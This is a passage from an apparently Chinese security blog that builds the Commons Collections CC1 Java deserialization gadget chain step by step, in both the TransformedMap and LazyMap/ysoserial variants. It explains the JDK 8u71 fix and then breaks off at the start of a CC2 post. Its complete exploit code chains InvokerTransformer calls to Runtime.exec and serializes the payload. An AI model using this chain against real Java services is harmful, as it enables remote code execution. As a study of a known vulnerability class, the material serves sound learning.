<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br><br>        <br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);<br>        <br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(<span class="hljs-string">&quot;key&quot;</span>, <span class="hljs-string">&quot;value&quot;</span>);<br>        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(map, <span class="hljs-literal">null</span>, invokerTransformer);<br><br>		<br>		<span class="hljs-comment">//反射获取AnnotationInvocationHandler</span><br>        Class&lt;?&gt; c = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; annotationInvocationdhdlConstructor = c.getDeclaredConstructor(Class.class, Map.class);<br>        annotationInvocationdhdlConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> annotationInvocationdhdlConstructor.newInstance(Override.class, transformedMap);<br><br>        SER(o);<br>        UNSER(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br><br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">SER</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">UNSER</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="三个问题"><a href="#三个问题" class="headerlink" title="三个问题"></a>三个问题</h3><ol>
<li><p>Runtime并不能序列化</p>
</li>
<li><p>这个循环体不知道是否能进去</p>
</li>
<li><p><code>AnnotationInvocationHandler.readObject() </code>for循环中是<code>new AnnotationTypeMismatchExceptionProxy</code>并不是我们想要的Runtime类</p>
</li>
</ol>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240523152522150.png" alt="image-20240523152522150"></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240523151954472.png" alt="image-20240523151954472"></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240523151920747.png" alt="image-20240523151920747"></p>
<h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><p>解决问题一：虽然Runtime不可以序列化，但是Runtime.class可以</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//通过反射获取Runtime对象</span><br>Class&lt;Runtime&gt; c = Runtime.class;<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">getRuntimeMethod</span> <span class="hljs-operator">=</span> c.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>);<br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> (Runtime) getRuntimeMethod.invoke(<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">execMethod</span> <span class="hljs-operator">=</span> c.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);<br>        execMethod.invoke(r, <span class="hljs-string">&quot;calc&quot;</span>);<br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">     <span class="hljs-comment">//根据InvokerTransformer().transform()编写，相当于用这一串代码，实现上面的代码</span><br><span class="hljs-type">Method</span> <span class="hljs-variable">getRuntimeMethod</span> <span class="hljs-operator">=</span> (Method) <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;).transform(Runtime.class);<br><br>      <span class="hljs-type">Runtime</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> (Runtime) <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;).transform(getRuntimeMethod);<br><br>      <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;).transform(r);<br><br></code></pre></td></tr></table></figure>

<p>解决问题二：</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240523192532159.png" alt="image-20240523192532159"> </p>
<p>分析一下这段代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span><br>        <span class="hljs-keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;<br>        s.defaultReadObject();<br><br>        <span class="hljs-type">AnnotationType</span> <span class="hljs-variable">annotationType</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            annotationType = AnnotationType.getInstance(type);  <span class="hljs-comment">//这里的type就是我们刚刚传入的Override.class</span><br>        &#125; <span class="hljs-keyword">catch</span>(IllegalArgumentException e) &#123;<br>            <br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.InvalidObjectException(<span class="hljs-string">&quot;Non-annotation type in annotation serial stream&quot;</span>);<br>        &#125;<br><br>        Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();<br><br>        <br>        <span class="hljs-keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> memberValue.getKey();     <span class="hljs-comment">//获取成员方法，也就是获取Override的成员方法</span><br>            Class&lt;?&gt; memberType = memberTypes.get(name); <span class="hljs-comment">//查找成员方法</span><br>            <span class="hljs-keyword">if</span> (memberType != <span class="hljs-literal">null</span>) &#123;  	<span class="hljs-comment">//但是Override并没有值，所以根本走不到下面的判断，也就调用不了setValue()</span><br>                <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> memberValue.getValue();<br>                <span class="hljs-keyword">if</span> (!(memberType.isInstance(value) ||<br>                      value <span class="hljs-keyword">instanceof</span> ExceptionProxy)) &#123;<br>                    memberValue.setValue(<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">AnnotationTypeMismatchExceptionProxy</span>(<br>                            value.getClass() + <span class="hljs-string">&quot;[&quot;</span> + value + <span class="hljs-string">&quot;]&quot;</span>).setMember(<br>                                annotationType.members().get(name)));<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure>


<p>改写自己的代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br><span class="hljs-comment">//        Method getRuntimeMethod = (Method) new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;).transform(Runtime.class);</span><br><span class="hljs-comment">//        Runtime r = (Runtime) new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;).transform(getRuntimeMethod);</span><br><span class="hljs-comment">//        new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;).transform(r);</span><br><span class="hljs-comment">//这段的代码可以通过ChainedTransformer链式调用改写。</span><br>        <br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-comment">//key改为Target的成员方法</span><br>        map.put(<span class="hljs-string">&quot;value&quot;</span>, <span class="hljs-string">&quot;value&quot;</span>);<br>        Map&lt;Object,Object&gt; transformerMap = TransformedMap.decorate(map, <span class="hljs-literal">null</span>, chainedTransformer);<br>		<br>        <br>        Class&lt;?&gt; c = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; annotationInvocationdhdlConstructor = c.getDeclaredConstructor(Class.class, Map.class);<br>        annotationInvocationdhdlConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">//这里改为Target.class</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> annotationInvocationdhdlConstructor.newInstance(Target.class, transformerMap );<br><br>        SER(o);<br>        UNSER(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">SER</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">UNSER</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>解决问题三：</p>
<p><code>ConstantTransformer.transform</code>相当于传入什么就返回什么，这就很方便我们了，我们可以传入(Runtime.class)</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240523194708176.png" alt="image-20240523194708176"></p>
<h3 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h3><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(<span class="hljs-string">&quot;value&quot;</span>, <span class="hljs-string">&quot;value&quot;</span>);<br>        Map&lt;Object,Object&gt; transformerMap = TransformedMap.decorate(map, <span class="hljs-literal">null</span>, chainedTransformer);<br><br>        Class&lt;?&gt; c = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; annotationInvocationdhdlConstructor = c.getDeclaredConstructor(Class.class, Map.class);<br>        annotationInvocationdhdlConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> annotationInvocationdhdlConstructor.newInstance(Target.class, transformerMap );<br><br>        SER(o);<br><span class="hljs-comment">//        UNSER(&quot;ser.bin&quot;);</span><br><br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">SER</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">UNSER</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="ysoserial版本CC1"><a href="#ysoserial版本CC1" class="headerlink" title="ysoserial版本CC1"></a>ysoserial版本CC1</h2><p><img src="https://image.sp4rks.xyz/2024/06/image-20240523202238209.png" alt="image-20240523202238209"></p>
<p>其实这后面这部分和TransformMap版本是一样的。我们当时想调用<code>TransformMap.transform()</code>方法，TransformMap版本使用的是<code>TransformMap.checkSetValue()</code>。ysoserial版本使用的是<code>LazyMap.get()</code>。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240523202537062.png" alt="image-20240523202537062"></p>
<p> factory正好传入我们之前的<code>ChainedTransformer</code></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240523210551073.png" alt="image-20240523210551073"></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240523210636955.png" alt="image-20240523210636955"></p>
<p>LazyMap的意思是一开始不写key，等调用的时候通过transform()调用key，所以一开始要确保没有key;</p>
<p>接下来就找谁调用了get(),找到了<code>AnnotationInvocationHandler.invoke()</code>，而动态代理类会自动执行invoke方法，过这里的判断很简单，只需要不调用equls方法和不调用有参方法就能过这两个if。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240523211936873.png" alt="image-20240523211936873"></p>
<p><code>AnnotationInvocationHandler</code>从名字来看就是动态处理器类又正好<code>AnnotationInvocationHandler.readObject</code> 调用了<code>entrySet()</code>正好撞在枪口上。menberValues又可控。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240523212053262.png" alt="image-20240523212053262"></p>
<h3 id="完整代码-1"><a href="#完整代码-1" class="headerlink" title="完整代码"></a>完整代码</h3><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map, chainedTransformer);<br><br>        Class&lt;?&gt; c = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; annotationInvocationdhdlConstructor = c.getDeclaredConstructor(Class.class, Map.class);<br>        annotationInvocationdhdlConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>       <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span>(InvocationHandler) annotationInvocationdhdlConstructor.newInstance(Target.class, lazyMap );<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">mapProxy</span> <span class="hljs-operator">=</span> (Map)Proxy.newProxyInstance(LazyMap.class.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;, h);<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> annotationInvocationdhdlConstructor.newInstance(Target.class, mapProxy);<br><br><br><span class="hljs-comment">//        SER(o);</span><br>        UNSER(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br>     <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">SER</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">UNSER</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<h2 id="调用链"><a href="#调用链" class="headerlink" title="调用链"></a>调用链</h2><p><img src="https://image.sp4rks.xyz/2024/06/image-20240523205520055.png" alt="image-20240523205520055"></p>
<h2 id="后续官方修复方式"><a href="#后续官方修复方式" class="headerlink" title="后续官方修复方式"></a>后续官方修复方式</h2><h3 id="对于TransformMap版"><a href="#对于TransformMap版" class="headerlink" title="对于TransformMap版"></a>对于TransformMap版</h3><p>JDK 8u71 及以后的版本没有了能调用 ReadObject 中 <code>setValue()</code> 方法的地方。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/2024-05-24%20110816.png" alt="2024-05-24 110816"></p>
<h3 id="对于ysoserial版"><a href="#对于ysoserial版" class="headerlink" title="对于ysoserial版"></a>对于ysoserial版</h3><p>因为在8u71之后的版本反序列化不再通过<code>defaultReadObject</code>方式，而是通过<code>readFields</code> 来获取几个特定的属性，<code>defaultReadObject</code> 可以恢复对象本身的类属性，比如<code>this.memberValues</code> 就能恢复成我们原本设置的恶意类，但通过<code>readFields</code>方式，<code>this.memberValues</code> 就为null，所以后续执行get()就必然没发触发，这也就是高版本不能使用的原因。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240524111729060.png" alt="image-20240524111729060"></p>
<p><img src="https://image.sp4rks.xyz/2024/06/2024-05-24%20111150.png" alt="2024-05-24 111150"></p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blinkfox.github.io/2018/09/13/hou-duan/java/commons/commons-collections-bao-he-jian-jie/">Apache Commons Collections包和简介</a></p>
<p><a href="https://www.bilibili.com/video/BV1no4y1U7E1/?spm_id_from=333.999.0.0&vd_source=d195054a6a081ba07486dcc86c6ba707">Java反序列化CommonsCollections篇(一) CC1链手写EXP</a></p>
<p><a href="https://drun1baby.top/2022/06/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8701-CC1%E9%93%BE/">Java反序列化Commons-Collections篇01-CC1链</a></p>
]]></content>
      <categories>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVA安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Java反序列化CommonsCollections篇-CC2</title>
    <url>/2024/06/02/JAVA%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC2/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>CC3中我们了解到<code>TemplatesImpl()</code>调用<code>Transformer()</code>方法就可以代码执行。</p>
<p>CC2就在在这个基础上，结合CC4改写。CC2最大的优势就是不用<code>Transformer</code> 数组。</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ul>
<li>JDK8u65</li>
<li>CommonsCollections4</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.commons<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections4<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure>



<h2 id="CC2调用链分析"><a href="#CC2调用链分析" class="headerlink" title="CC2调用链分析"></a>CC2调用链分析</h2><p><img src="https://image.sp4rks.xyz/2024/06/CC2.png" alt="CC2"></p>
